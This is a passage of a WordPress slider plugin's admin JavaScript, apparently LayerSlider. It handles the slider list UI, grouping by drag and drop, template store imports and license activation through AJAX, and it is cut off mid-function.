var importModalWindowTimeline = null,
	importModalWindowTransition = null,
	importModalThumbnailsTransition = null,

	draggedSliderItem = null,
	targetSliderItem = null,

	sliderDragGroupingTimeout = null,
	sliderGroupRenameTimeout = null,

	$lastOpenedGroup,

	activeShuffleContainerIndex = 0

	projectRenameTimeout = 0;


// Stores the lastly selected slider item
// foe which the context menu was opened.
var LS_contextMenuSliderItem;


jQuery(function($) {

	kmUI.dropdown.init();

	$('#ls-list-main-menu ls-button[data-scroll]').on('click', function() {
		scrollToElement( $( this ).data('scroll') );
	});

	// Auto-submit filter/search bar when choosing different view mode
	// from drop-down menus.
	$('#ls-slider-filters').on('change', 'select', function() {
		$(this).closest('#ls-slider-filters').submit();
	});

	$('#ls-plugin-settings-tabs input[name="ls_gdpr_goole_fonts"]').on('change', function() {

		var $checkbox 	= $( this ),
			$wrapper 	= $('.ls-show-if-google-fonts-enabled');

		$wrapper[ $checkbox.prop('checked') ? 'removeClass' : 'addClass' ]('ls-hidden');
	}).change();

	$('#ls-plugin-settings-tabs .ls-empty-google-fonts').on('click', function( event ) {

		event.preventDefault();
		lsCommon.smartAlert.confirm( LS_l10n.GFEmptyConfirmation, () => {
			document.location.href = $( this ).attr('href');
		});
	});

	$('#ls-global-google-fonts').on('click', '.ls-remove-font', function() {

		lsCommon.smartAlert.confirm( LS_l10n.GFRemoveConfirmation, () => {

			var $fontItem = $( this ).closest('.ls-font-item');

			$fontItem.css({ opacity: 0, transform: 'scale(0)'});
			setTimeout( function() {
				$fontItem.remove();
				saveGoogleFonts();
			}, 250 );
		});
	});

	$( document ).on('click', '.ls-open-plugin-settings-button', function() {

		kmw.modal.open({
			content: $('#tmpl-plugin-settings-content'),
			clip: true,
			minWidth: 400,
			maxHeight: '90%',
			maxWidth: 1280,
			sidebar: {
				left: {
					width: 300,
					customHeaderHeight: true,
					content: $('#tmpl-plugin-settings-sidebar')
				}
			}
		});
	});

	$( document ).on('click', '.ls-open-fonts-library', function() {

		LS_fontLibrary.open( function( fontName ) {

			LS_fontLibrary.close();

			setTimeout( function() {

				var $template = $( $('#ls-font-item-template').html() );

				$template.find('.ls-font-name').text( fontName ).css('font-family', '"'+fontName+'"');
				$('#ls-global-google-fonts').prepend( $template );
				saveGoogleFonts();
			}, 800 );
		});
	});


	$( document ).on('click', '#ls-plugin-settings-content input', function( event ) {

		const 	$checkbox 	= $( this ),
				checked 	= $checkbox.prop('checked');

		// Enable warning
		if( checked && $checkbox.data('warning-enable') ) {

			event.preventDefault();
			event.stopPropagation();

			lsCommon.smartAlert.confirm( $checkbox.data('warning-enable'), () => {
				$checkbox.prop('checked', true ).trigger('change');
			});

		}

		// Disable warning
		if( ! checked && $checkbox.data('warning-disable') ) {

			event.preventDefault();
			event.stopPropagation();

			lsCommon.smartAlert.confirm( $( this ).data('warning-disable'), () => {
				$checkbox.prop('checked', false ).trigger('change');
			});
		}

	});


	var pluginSettingsTimout;
	$( document ).on('change input', '#ls-plugin-settings-content input, #ls-plugin-settings-content select', function() {

		clearTimeout( pluginSettingsTimout );
		pluginSettingsTimout = setTimeout( function() {

			const formData = $('#ls-plugin-settings-content').serialize();

			$.post( ajaxurl, formData, ( responseData ) => {

			});

		}, 500 );
	});

	$( document ).on('click', '.ls-show-canceled-activation-modal', function() {
		kmw.modal.open({
			content: '#tmpl-canceled-activation-modal',
			modalClasses: 'tmpl-canceled-activation-modal',
			minWidth: 400,
			maxWidth: 960,
		});
	});

	// Twitter feed
	window.lsTwitterFeedInterval = setInterval( function() {

		let $iframe 	= $('#ls--box-twitter-feed iframe'),
			$contents 	= $iframe.contents(),
			$header 	= $contents.find('.timeline-Header');

		if( $header.length ) {

			$contents.find('head').append('<link rel="stylesheet" href="'+LS_pageMeta.assetsPath+'/static/admin/css/twitter.css" type="text/css" />');
			clearInterval( window.lsTwitterFeedInterval );
		}


	}, 200 );

	// Fallback Twitter feed
	setTimeout( function() {
		clearInterval( window.lsTwitterFeedInterval );
	}, 5000 );


	$('#ls-notification-clear-button').click( function() {

		$('.ls-notifications-button').removeClass('ls-active');
		$('#ls-notification-panel .ls-notification-unread').removeClass('ls-notification-unread');
		$('.ls-fancy-notice-wrapper .ls-notification-dismissible').slideUp( 400, function() {
			$( this ).remove();

			if( ! $('.ls-fancy-notice-wrapper').children().length ) {
				$('#ls-list-main-menu').removeClass('ls-has-inline-notifications');
			}
		});

		$.getJSON( ajaxurl, { action: 'ls_clear_notifications' });
	});

	jQuery('.ls-slider-list-items').on('click', ':checkbox', function() {

		$( this ).closest('.slider-item').toggleClass('ls-selected');
		checkSliderSelection();
	});



	$('.ls-slider-list-items').on('contextmenu', '.slider-item', function( event ) {

		if( $( event.target ).is('input') ) {
			return true;
		}

		var $sliderItem = $( this );

		if( $sliderItem.hasClass('group-item') ) {
			event.preventDefault();
			return;
		}

		LS_contextMenuSliderItem = $sliderItem;

		LS_ContextMenu.open( event, {
			width: 230,
			selector: '.ls-sliders-list-context-menu',
			template: '#tmpl-ls-sliders-list-context-menu',
			onBeforeOpen: function( $contextMenu ) {

				if( event.manualOpen ) {
					$sliderItem.addClass('ls-context-menu-open');
				}

				$sliderItem.addClass('ls-highlight-row');
				$contextMenu.removeClass('ls-hidden-slider');

				if( $sliderItem.data('hidden') ) {
					$contextMenu.addClass('ls-hidden-slider');
				}
			},

			onClose: function() {
				$('.slider-item').removeClass('ls-context-menu-open ls-highlight-row');
			}
		});


	}).on('click', '.slider-item .ls-preview', function( event ) {

		if( event.ctrlKey || event.metaKey ) {

			event.preventDefault();

			$( this ).closest('.slider-item').find('.slider-checkbox').click();
		}


	}).on('mouseenter', '.slider-actions-button, .slider-item-wrapper input', function() {
		$( this ).closest('.slider-item').addClass('ls-block-active-state');

	}).on('mouseleave', '.slider-actions-button, .slider-item-wrapper input', function() {
		$( this ).closest('.slider-item').removeClass('ls-block-active-state');

	}).on('input', '.slider-item-wrapper .ls--project-name-input', function() {

		var $this = $( this );

		clearTimeout( projectRenameTimeout );
		projectRenameTimeout = setTimeout( function() {

			var $item = $this.closest('.slider-item'),
				data  = $item.data(),
				nonce = $('.ls-slider-list-form input[name="_wpnonce"]').val();

			$.post( ajaxurl, {
				action: 'ls_rename_project',
				id: data.id,
				name: $this.val(),
				_wpnonce: nonce,
			});

		}, 500 );


	}).on('click', '.slider-actions-button', function() {

		var $this 	= jQuery( this ),
			offsets = $this.offset(),
			width 	= $this.width(),
			height 	= $this.height();


		jQuery('.ls-slider-list-items').triggerHandler(

			jQuery.Event( 'contextmenu', {
				target: $this[0],
				pageX: offsets.left - 3,
				pageY: offsets.top + height + 7,
				manualOpen: true,
				alignRight: {
					pageX: offsets.left + width
				}
			})
		);


	}).on('click', '.slider-item.group-item', function( e ) {
		e.preventDefault();

		var $this 		= $( this ),
			groupName 	= $.trim( $this.find('.ls-name ls-span').html() ).replace(/"/g, '&quot;');

		$lastOpenedGroup = $this;

		kmw.modal.open({
			into: '.ls-sliders-grid',
			title: '<input value="'+groupName+'"><a href="#" class="ls--button ls--bg-blue ls--small ls-remove-group-button" data-help="'+LS_l10n.SLRemoveGroupTooltip+'" data-help-delay="100">'+LS_l10n.SLRemoveGroupButton+'</a>',
			content: $this.next().children(),
			maxWidth: 1380,
			minWidth: 600,
			spacing: 60,
			modalClasses: 'ls-slider-group-modal-window ls--form-control',
			animationIn: 'scale',
			overlaySettings: {
				animationIn: 'fade',
				customStyle: {
					backgroundColor: 'rgba( 225, 225, 225, 0.95 )'
				}
			},
			onBeforeOpen: function() {
				jQuery('#ls-slider-selection-bar-placeholder').show();
				jQuery('#ls-slider-selection-bar').addClass('ls-overlay-selection-bar');
			},
			onClose: function() {
				jQuery('#ls-slider-selection-bar-placeholder').hide();
				jQuery('#ls-slider-selection-bar').removeClass('ls-overlay-selection-bar');
			}
		});



		setTimeout( function() {
			removeSliderFromGroupDraggable();
		}, 200);

	});


	$( document ).on('input', '.ls-slider-group-modal-window .kmw-modal-title input', function() {

		$this = $( this );

		clearTimeout( sliderGroupRenameTimeout );
		sliderGroupRenameTimeout = setTimeout( function() {

			$.get( ajaxurl, {
				action: 'ls_rename_slider_group',
				groupId: $lastOpenedGroup.data('id'),
				name: $this.val()
			});

		}, 300 );


		$lastOpenedGroup.find('.ls-name ls-span').text( $this.val() );
	});

	$( document ).on('click', '.ls-slider-group-modal-window .ls-remove-group-button', function( e) {

		e.preventDefault();
		kmUI.popover.close();

		lsCommon.smartAlert.confirm( LS_l10n.SLRemoveGroupConfirm, () => {

			$.get( ajaxurl, {
				action: 'ls_delete_slider_group',
				groupId: $lastOpenedGroup.data('id'),
			});

			var $sliders = $('.ls-slider-group-modal-window .slider-item');

			// Destroy previous draggable instance (if any)
			if( $sliders.hasClass('ui-draggable') ) {
				$sliders.draggable('destroy');
			}

			// Destroy previous droppable instance (if any)
			if( $sliders.hasClass('ui-droppable') ) {
				$sliders.droppable('destroy');
			}

			$sliders.prependTo('.ls-sliders-grid');

			setTimeout( function() {
				addSliderToGroupDraggable();
				addSliderToGroupDroppable();

				createSliderGroupDroppable();
			}, 300 );


			$lastOpenedGroup.next().remove();
			$lastOpenedGroup.remove();

			kmw.modal.close();
		});

	});

	jQuery('#ls-add-slider-button').click( function( e ) {
		e.preventDefault();

		kmw.modal.open({
			content: '#tmpl-add-new-slider',
			maxWidth: 415,
			minWidth: 415,
			onOpen: function() {
				$('#add-new-slider-modal input').focus();
			}

		});
	});

	jQuery('#ls-addons-button').click( function( e ) {
		e.preventDefault();

		kmw.modal.open({
			id: 'ls-premium-benefits-modal',
			content: '<iframe src="https://layerslider.com/premium-embed/" frameborder="0" allowtransparency="true" allowfullscreen="true"></iframe>',
			maxWidth: 1280,
			maxHeight: '100%',
			padding: 0,
			spacing: 20,
			closeButton: true
		});
	});


	// Import Sliders
	$('#ls-list-buttons').on('click', '#ls-import-button', function(e) {
		e.preventDefault();

		kmw.modal.open({
			content: $('#tmpl-upload-sliders').text(),
			minWidth: 400,
			maxWidth: 700
		});

	});

	// Pagivation
	$('.pagination-links a.disabled').click(function(e) {
		e.preventDefault();
	});



	// Drag and drop import
	var importTileDropZone;
	$( document ).on('dragenter.ls', '.ls-item.import-sliders', function( e ) {
		e.preventDefault();
		importTileDropZone = e.target;
		$( this ).addClass('ls-dragover')

	}).on('dragleave.ls drop.ls', '.ls-item.import-sliders', function( e ) {
		e.preventDefault();
		if( e.target == importTileDropZone ) {
			$( this ).removeClass('ls-dragover')
		}

	}).on('dragover.ls', '.ls-item.import-sliders', function( e ) {
		e.preventDefault();

	}).on('drop.ls', '.ls-item.import-sliders', function( event ) {

		var oe 		= event.originalEvent,
			files 	= event.originalEvent.dataTransfer.files,
			$this 	= $( this ),
			$form 	= $('#tmpl-quick-import-form');


		// Prevent uploading empty or multiple file selection
		if( files.length === 0 ||  files.length > 1 ) {
			return false;
		}

		// Prevent uploading files other than ZIP packages
		if( files[0].name.toLowerCase().indexOf('.zip') === -1 ) {
			return false;
		}


		if( ! $form.length ) {
			$form = $( $('#tmpl-quick-import').text() ).prependTo('body');
		}

		$this.addClass('importing');

		$form.find('input[type="file"]')[0].files = files;
		$form.submit();
	});

	// Import window file input
	$( document ).on( 'change', '#ls-upload-modal-window .ls-form-file input', function() {

		var file = this.files[0],
			$input = $(this),
			$parent = $input.parent(),
			$span = $input.prev();

		if( !$input.data( 'original-text' ) ){
			$input.data( 'original-text', $span.text() );
		}

		if( file ) {
			$span.text( file.name );
			$parent.addClass( 'file-chosen' );
		} else {
			$span.text( $input.data( 'original-text' ) );
			$parent.removeClass( 'file-chosen' );
		}
	});




	// Import sample slider
	$( '#ls-browse-templates-button' ).on( 'click', function( event ) {

		event.preventDefault();

		var	$modal;

		// If the Template Store was previously opened on the current page,
		// just grab the element, do not bother re-appending and setting
		// up events, etc.

		// Append dark overlay
		if( !jQuery( '#ls-import-modal-overlay' ).length ){
			jQuery( '<div id="ls-import-modal-overlay">' ).appendTo( '#wpwrap' );
		}

		if( jQuery( '#ls-import-modal-window' ).length ){

			$modal = jQuery( '#ls-import-modal-window' );

		// First time open on the current page. Set up the UI and others.
		} else {

			// Append the template & setup the live logo
			$modal = jQuery( jQuery('#tmpl-import-sliders').text() ).hide().prependTo('body');

			// Update last store view date
			if( $modal.hasClass('has-updates') ) {
				jQuery.get( window.ajaxurl, { action: 'ls_store_opened' });
			}

			importModalWindowTimeline = new TimelineMax({
				onStart: function(){
					jQuery( '#ls-import-modal-overlay' ).show();
					jQuery( 'html, body' ).addClass( 'ls-no-overflow' );
					jQuery(document).on( 'keyup.LS', function( e ) {
						if( e.keyCode === 27 ){
							jQuery( '#ls-browse-templates-button' ).data( 'lsModalTimeline' ).reverse().timeScale(1.5);
						}
					});
				},
				onComplete: function(){
					if( importModalWindowTimeline ) {
						importModalWindowTimeline.remove( importModalThumbnailsTransition );
					}
					featuredSlideshow.start();

				},
				onReverseComplete: function(){
					featuredSlideshow.stop();
					jQuery( 'html, body' ).removeClass( 'ls-no-overflow' );
					jQuery(document).off( 'keyup.LS' );
					jQuery( '#ls-import-modal-overlay' ).hide();
					TweenMax.set( jQuery( '#ls-import-modal-window' )[0], { css: { y: -100000 } });
				},
				paused: true
			});

			$(this).data( 'lsModalTimeline', importModalWindowTimeline );

			importModalWindowTimeline.fromTo( $('#ls-import-modal-overlay')[0], 0.75, {
				autoCSS: false,
				css: {
					opacity: 0
				}
			},{
				autoCSS: false,
				css: {
					opacity: 0.75
				},
				ease: Quart.easeInOut
			}, 0 );

			importModalThumbnailsTransition = TweenMax.fromTo( $( '#ls-import-modal-window ls-templates-container.ls--active' )[0], 0.5, {
				autoCSS: false,
				css: {
					opacity: 0
				}
			},{
				autoCSS: false,
				css: {
					opacity: 1
				},
				ease: Quart.easeInOut
			});

			importModalWindowTimeline.add( importModalThumbnailsTransition, 0.75 );
		}

		importModalWindowTimeline.remove( importModalWindowTransition );

		importModalWindowTransition = TweenMax.fromTo( $modal[0], 0.75, {
			autoCSS: false,
			css: {
				position: 'fixed',
				display: 'block',
				y: 0,
				x: jQuery( window ).width()
			}
		},{
			autoCSS: false,
			css: {
				x: 0
			},
			ease: Quart.easeInOut
		}, 0 );

		importModalWindowTimeline.add( importModalWindowTransition, 0 );

		importModalWindowTimeline.play();
	});


	$( document ).on( 'click', '#ls-import-modal-window .ls--close-templates', function(){
		$( '#ls-browse-templates-button' ).data( 'lsModalTimeline' ).reverse();

	}).on('submit', '#ls-upload-modal-window form', function(e) {

		jQuery('.button', this).text(LS_l10n.SLUploadProject).addClass('saving');

	}).on('click', '.ls-open-add-new-slider', function(e) {

		e.preventDefault();

		kmw.modal.close();

		$('#ls-add-slider-button').click();

	}).on('click', '.ls-open-template-store', function(e) {

		e.preventDefault();

		kmw.modal.close();

		setTimeout(function() {
			$('#ls-browse-templates-button').click();
		}, $(this).data('delay') || 0);
	});

	$('#ls--release-channel select').change( function() {

	var $select = $( this ),
		$form 	= $select.closest('form');


		$.getJSON( ajaxurl, $form.serialize(), function( data ) {

			kmUI.notify.show({
				icon: 'success',
				text: LS_l10n.releaseChannelUpdated,
				timeout: 2000
			});
		});
	});

	// Template Store: Category selector
	$( document ).on( 'click', '#ls-import-modal-window [data-show-category]', function() {
		var $el = $( this );
		changeCategory( $( this ).attr('data-show-category') );

		if( $el.attr( 'data-show-tag') ){
			$( '#ls-import-modal-window ls-templates-container.ls--active ls-tag[data-handle="'+ $el.attr( 'data-show-tag') +'"]' ).click();
		}
	});

	var changeCategory = function( category ){
		$( '#ls-import-modal-window ls-templates-nav [data-show-category]' ).removeClass('ls--active');
		$( '#ls-import-modal-window ls-templates-nav [data-show-category="'+category+'"]' ).addClass( 'ls--active' );

		$( '#ls-import-modal-window ls-templates-container' ).removeClass( 'ls--active' );
		$( '#ls-import-modal-window ls-templates-container[data-category="'+category+'"]' ).addClass( 'ls--active' );

		$( 'ls-templates-containers' ).scrollTop(0);
	};

	// Template Store: Collections
	$( document ).on( 'click', '#ls-import-modal-window [data-show-category="collections"]', function(e){
		e.preventDefault();
		if( !$('#ls--collection-templates').children().length ){
			$( 'ls-templates-holder.ls--collections-list ls-template.ls--active' ).click();
		}
	}).on( 'click', '#ls-import-modal-window [data-show-collection]', function(e){
		e.preventDefault();
		changeCategory( 'collections' );
		$( 'ls-templates-holder.ls--collections-list ls-template[data-handle="'+$(this).attr('data-show-collection')+'"]' ).click();
	}).on( 'click', '#ls-import-modal-window ls-templates-holder.ls--collections-list ls-template', function(){
		var $activeCollectionSelector = $( this );
		$activeCollectionSelector.addClass( 'ls--active' ).siblings().removeClass( 'ls--active' );
		getCollectionItems( $activeCollectionSelector.attr( 'data-handle'), $activeCollectionSelector.attr( 'data-name' ) );
	});

	// Template Store: Tags
	$( document ).on( 'click', '#ls-import-modal-window ls-tag', function() {

		var $curTag = $(this),
			handle = $curTag.attr( 'data-handle' ),
			$templatesHolder = $curTag.closest( 'ls-templates-container' ).find( 'ls-templates-holder' ),
			$allTemplates = $templatesHolder.find( 'ls-template' ),
			$filteredTemplates = $templatesHolder.find( 'ls-template[data-groups*="'+handle+'"]' ),
			$allButFilteredTemplates = $templatesHolder.find( 'ls-template:not([data-groups*="'+handle+'"])' );

			$curTag.addClass('ls--active').siblings().removeClass('ls--active');
			$allTemplates.show();
			if( handle === '' || handle === 'all' ){
				return;
			}
			$allButFilteredTemplates.hide();
	});

	var getCollectionItems = function( handle, name ){

		$( '#ls--collection-templates' ).empty();
		$( '.ls-template-collections-target ls-template[data-collections*="' + handle + '"]' )
			.clone()
			.show()
			.sort( ( a, b ) => {
				return parseInt( b.dataset.order ) - parseInt( a.dataset.order );
			})
			.appendTo( '#ls--collection-templates' );
		$( '#ls--collection-title ls-ib span').text( name );
	};

	// Template Store: Featured
	$( document ).on( 'click', '#ls-import-modal-window ls-featured-bullet', function( event ) {
		var index = $( this ).index( '#ls-import-modal-window ls-templates-featured ls-featured-bullet' );
		featuredSlideshow.change( index, event );
	});

	var featuredSlideshow = {

		timer: 60,
		interval: 0,

		start: function(){

			this.itemsNum = $( '#ls-import-modal-window ls-templates-featured ls-featured-bullet' ).length;

			if( this.itemsNum > 1 ){
				this.currentIndex = 0;
				this.timer = parseInt( $( '#ls-import-modal-window ls-templates-featured' ).attr( 'data-slideshow-interval' ) ) || this.timer;

				this.startInterval();
			}
		},

		startInterval: function() {

			clearInterval( this.interval );
			this.interval = setInterval( () => {
				this.change();
			}, this.timer * 1000 );
		},

		stop: function(){
			clearInterval( this.interval );
		},

		change: function( index, event ){

			if( typeof index !== 'undefined' ) {
				this.currentIndex = index;
			} else {

				if( this.currentIndex + 1 >= this.itemsNum ){
					this.currentIndex = 0;
				}else{
					this.currentIndex++;
				}
			}

			var $bullet = $('#ls-import-modal-window ls-templates-featured ls-featured-bullet').eq( this.currentIndex );

			$bullet.addClass('ls--active').siblings( 'ls-featured-bullet' ).removeClass( 'ls--active' );
			$( '#ls-import-modal-window ls-templates-featured ls-featured-item' ).eq( this.currentIndex ).addClass( 'ls--active' ).siblings( 'ls-featured-item' ).removeClass( 'ls--active' );

			if( typeof event !== 'undefined' ) {
				featuredSlideshow.startInterval();
			}
		}
	};



	// Auto-update and License registration
	$('#ls--box-license form').submit(function(e) {

		// Prevent browser default submission
		e.preventDefault();

		var $form 	= $(this),
			$key 	= $form.find('input[name="purchase_code"]'),
			$button = $form.find('.button-save:visible');

		if( $key.val().length < 10 ) {
			lsCommon.smartAlert.open( LS_l10n.SLEnterCode );
			return false;
		}

		// Send request and provide feedback message
		$button.data('text', $button.text() ).text(LS_l10n.working);

		// Post it
		$.ajax({
			type: 'POST',
			url: ajaxurl,
			data: $(this).serialize(),
			error: function( jqXHR, textStatus, errorThrown ) {
				lsCommon.smartAlert.open({
					width: 700,
					theme: 'red',
					title: LS_l10n.SLActivationErrorTitle,
					text: LS_l10n.SLActivationError.replace('%s', errorThrown)
				});
				$button.removeClass('saving').text( $button.data('text') );
			},
			success: function( data ) {

				// Parse response and set message
				data = $.parseJSON(data);

				// Success
				if( data && ! data.errCode ) {

					// Updated license, was already registered
					if( LS_slidersMeta.isActivatedSite ) {

						kmUI.notify.show({
							icon: 'success',
							text: LS_l10n.licenseKeyUpdated,
							timeout: 2000
						});
					}

					// Make sure that features requiring activation will
					// work without refreshing the page.
					LS_slidersMeta.isActivatedSite = true;

					// Update GUI to reflect the "registered" state
					$( '#ls--license-slider' ).layerSlider( 2 );
					LS__setRegistered( true );

				// HTML-based error message (if any)
				} else if( typeof data.messageHTML !== "undefined" ) {

					kmw.modal.open({
						title: data.titleHTML ? data.titleHTML : LS_l10n.activationErrorTitle,
						content: '<div id="tmpl-activation-error-modal-window">'+data.messageHTML+'</div>',
						maxWidth: 660,
						minWidth: 400
					});

				// Alert message (if any)
				} else if( typeof data.message !== "undefined" ) {
					lsCommon.smartAlert.open( data.message );
				}

				$button.removeClass('saving').text( $button.data('text') );
			}
		});
	});


	// Auto-update deauthorization
	$('#ls--box-license a.ls-deauthorize').click(function(event) {
		event.preventDefault();

		var $form = $(this).closest('form');

		$.get( ajaxurl, $.param({ action: 'ls_deauthorize_site' }), function(data) {

			// Parse response and set message
			var data = $.parseJSON(data);

			if( data && ! data.errCode ) {

				$form.find('.ls--key input').val('');

				LS_slidersMeta.isActivatedSite = false;


				// Update GUI to reflect the "registered" state
				$( '#ls--license-slider' ).layerSlider( 1 );
				LS__setRegistered( false );

				// Display notification modal window
				kmw.modal.open({
					content: '#tmpl-deregister-license',
					maxWidth: 560,
					minWidth: 560
				});
			}

			// Alert message (if any)
			if( typeof data.message !== "undefined" ) {
				lsCommon.smartAlert.open( data.message );
			}
		});
	});

	var lsShowActivationBox = function( activateBox ) {

		document.location.hash = '';

		kmw.modal.close();

		var $box = $('#ls--box-license');


		if( ! $box.length || $box.is(':hidden') ) {
			kmw.modal.open({
				content: '#tmpl-activation-unavailable',
				maxWidth: 600
			});

			return false;
		}

		scrollToElement( $('#ls--box-license') );
	};

	$( document ).on('click', '.ls-show-activation-box', function(e) {
		e.preventDefault();
		lsShowActivationBox();
	}).on('click', '.ls-premium-lock-templates', function( e ) {
		e.preventDefault();
		lsDisplayActivationWindow({
			title: LS_l10n.notifyPremiumTemplateMT
		});
	});

	$( document ).on('click', '#lse-activation-modal-window .lse-button-activation', function( e ) {

		e.preventDefault();

		if( $(this).closest('#ls-import-modal-window').length ) {

			jQuery(document).trigger( jQuery.Event('keyup', { keyCode: 27 }) );
			setTimeout(function() {
				lsShowActivationBox( true );
			}, 800);

		} else {

			kmw.modal.close( false, {
				onClose: function() {
					lsShowActivationBox( true );
				}
			});
		}
	});

	if( document.location.href.indexOf('#activationBox') !== -1 ) {
		setTimeout(function() {
			lsShowActivationBox( true );
		}, 500 );
	}


	// Shortcode
	$('input.ls-shortcode').click(function() {
		this.focus();
		this.select();
	});

	// Template Store Import
	$( document ).on('click', '#ls-import-modal-window .ls--import-template-button', function( event ) {
		event.preventDefault();

		var $item 		= jQuery(this),
			name 		= $item.data('name'),
			handle 		= $item.data('handle'),
			category 	= $item.data('category'),
			bundled 	= !! $item.data('bundled'),
			action 		= bundled ? 'ls_import_bundled' : 'ls_import_online';


		// Premium notice
		if( $item.data('premium') && ! LS_slidersMeta.isActivatedSite ) {

			lsDisplayActivationWindow({
				into: '#ls-import-modal-window',
				title: LS_l10n.activationTemplate
			});

			return;

		// Version warning
		} else if( $item.data('version-warning') ) {

			kmw.modal.open({
				into: '#ls-import-modal-window',
				content: '#tmpl-version-warning',
				id: 'ls-version-warning',
				minWidth: 500,
				maxWidth: 500
			});
			return;
		}

		kmw.modal.open({
			content: '#tmpl-importing',
			into: '#ls-import-modal-window',
			minWidth: 300,
			maxWidth: 300,
			closeButton: false,
			closeOnEscape: false,
			animationIn: 'scale',
			overlaySettings: {
				closeOnClick: false,
				animationIn: 'fade'
			}
		});

		jQuery.ajax({
			url: ajaxurl,
			data: {
				action: action,
				slider: handle,
				name: name,
				category: category,
				security: window.lsImportNonce
			},

			beforeSend: function( jqXHR, settings ) {

				setTimeout( function( ) {

					var $modal = jQuery('#ls-loading-modal-window').closest('.kmw-modal');

					TweenLite.to( $modal[0], 0.5, {
						minWidth: 580,
						maxWidth: 580,
						height: 446,
						maxHeight: 480,

						onComplete: function() {
							$('<div class="ls-import-notice">'+LS_l10n.SLImportNotice+'</div>')
							.hide()
							.appendTo( $modal.find('.kmw-modal-content') )
							.fadeIn( 250 );
						}
					});
				}, 1000*60 );
			},

			success: function(data, textStatus, jqXHR) {

				data = data ? JSON.parse( data ) : {};

				if( data.success ) {
					document.location.href = data.url;

				} else {

					kmw.modal.close();

					if( data.reload ) {
						window.location.reload( true );
						return;
					}

					if( data.errCode && data.errCode == 'ERR_WW_POPUPS_PURCHASE_NOT_FOUND') {

						lsDisplayActivationWindow({
							into: '#ls-import-modal-window',
							title: LS_l10n.purchaseWWPopups,
							content: '#tmpl-purchase-webshopworks-popups',
							minHeight: 680,
							maxHeight: 680
						});

						return;
					}

					setTimeout(function() {

						lsCommon.smartAlert.open({
							theme: 'red',
							width: 700,
							title: data.title || LS_l10n.SLImportErrorTitle,
							text: data.message || LS_l10n.SLImportError,
						});

					}, 600);
				}
			},
			error: function(jqXHR, textStatus, errorThrown) {

				kmw.modal.close();

				setTimeout(function() {

					lsCommon.smartAlert.open({
						width: 700,
						theme: 'red',
						title: LS_l10n.SLImportErrorTitle,
						text: LS_l10n.SLImportHTTPError.replace('%s', errorThrown)
					});

				}, 600);
			},
			complete: function() {

			}
		});
	});

	if( document.location.hash === '#open-template-store' ) {
		setTimeout( function() {
			$('#ls-browse-templates-button').click();
		}, 500);


	} else if( document.location.hash === '#open-addons' ) {
		setTimeout( function() {
			$('#ls-addons-button').click();
		}, 500);
	}



	var addSliderToGroupDraggable = function() {

		$('.ls-sliders-grid > .slider-item').draggable({
			scope: 'add-to-group',
			cancel: '.group-item, .ls-hero',
			handle: '.ls-preview',
			distance: 5,
			helper: 'clone',
			revert: 'invalid',
			revertDuration: 300,
			start: function( event, ui ) {

				draggedSliderItem = event.target;
				$( draggedSliderItem ).addClass('dragging-original');
			},

			stop: function( event, ui ) {
				$( event.target ).removeClass('dragging-original');
			}
		});
	};


	var addSliderToGroupDroppable = function() {

		$('.ls-sliders-grid .group-item').droppable({
			scope: 'add-to-group',
			accept: '.slider-item',
			tolerance: 'pointer',
			hoverClass: 'slider-dropping',
			over: function( event, ui ) {

				ui.helper.find('.ls-preview').addClass('slider-dropping');
			},

			out: function( event, ui ) {
				ui.helper.find('.ls-preview').removeClass('slider-dropping');
			},


			drop: function( event, ui ) {

				addSliderToGroup( event.target, draggedSliderItem );
			}
		});
	};



	var removeSliderFromGroupDraggable = function() {

		$('.ls-sliders-grid .kmw-modal-inner .slider-item').draggable({
			scope: 'remove-from-group',
			handle: '.ls-preview',
			appendTo: '.ls-sliders-grid',
			distance: 5,
			helper: 'clone',
			zIndex: 9999999,
			revert: 'invalid',
			revertDuration: 300,
			start: function( event, ui ) {
				draggedSliderItem = event.target;
				$( draggedSliderItem ).addClass('dragging-original');
				$('#ls-group-remove-area').addClass('active');
			},

			stop: function( event, ui ) {
				$( draggedSliderItem ).removeClass('dragging-original');
				$('#ls-group-remove-area').removeClass('active');
			}
		});
	};


	var removeSliderFromGroupDroppable = function() {

		$('#ls-group-remove-area .ls-drop-area').droppable({
			scope: 'remove-from-group',
			accept: '.slider-item',
			tolerance: 'pointer',

			over: function( event, ui ) {
				ui.draggable.addClass('over-drag-area');
				ui.helper.find('.ls-preview').addClass('cursor-default');
				$( event.target ).addClass('over');
			},

			out: function( event, ui ) {
				ui.draggable.removeClass('over-drag-area');
				ui.helper.find('.ls-preview').removeClass('cursor-default');
				$( event.target ).removeClass('over');
			},

			drop: function( event, ui ) {

				$( event.target ).removeClass('over');
				ui.draggable.removeClass('over-drag-area');

				removeSliderFromGroup(
					$lastOpenedGroup,
					ui.draggable
				);
			}
		});
	};



	var createSliderGroupLastEvent;

	var createSliderGroupDroppable = function() {

		$('.ls-sliders-grid .slider-item:not(.ls-hero,.group-item)').droppable({
			scope: 'add-to-group',
			accept: '.slider-item',
			tolerance: 'pointer',
			hoverClass: 'slider-dropping',

			over: function( event, ui ) {

				var f = function(){
					targetSliderItem = event.target;
					$( event.target ).addClass('create-group');
					ui.helper.find('.ls-preview').addClass('slider-dropping');
					createSliderGroupLastEvent = 'over';
				};

				if( createSliderGroupLastEvent == 'over' ){
					setTimeout( function(){
						f();
					}, 0 );
				} else {
					f();
				}
			},

			out: function( event, ui ) {

				var f = function(){
					targetSliderItem = null;
					$('.slider-item').removeClass('create-group');
					ui.helper.find('.ls-preview').removeClass('slider-dropping');
					createSliderGroupLastEvent = 'out';
				};

				if( createSliderGroupLastEvent == 'out' ){

					setTimeout( function(){
						f();
					}, 0 );
				} else {
					f();
				}
			},

			deactivate: function( event, ui ) {
				clearTimeout( sliderDragGroupingTimeout );
				$('.slider-item').removeClass('create-group');
				ui.helper.find('.ls-preview').removeClass('slider-dropping');
			},

			drop: function( event, ui ) {

				if( targetSliderItem ) {

					var $template 	= $( $('#tmpl-slider-group-item').text() ),
						$markup 	= $template.insertAfter( targetSliderItem ),
						$group 		= $markup.filter('.group-item');

					addSliderToGroup( $group, targetSliderItem, true );
					addSliderToGroup( $group, draggedSliderItem, true );

					$( targetSliderItem ).hide();
					$( draggedSliderItem ).hide();

					addSliderToGroupDroppable();

					$.getJSON( ajaxurl, {
						action: 'ls_create_slider_group',
						items: [
							$( targetSliderItem ).data('id'),
							$( draggedSliderItem ).data('id')
						]

					}, function( data ) {
						$group.data('id', data.groupId );
					});
				}
			}
		});
	};






	var addSliderToGroup = function( groupElement, sliderElement, withoutXHR ) {

		var $group 			= $( groupElement ),
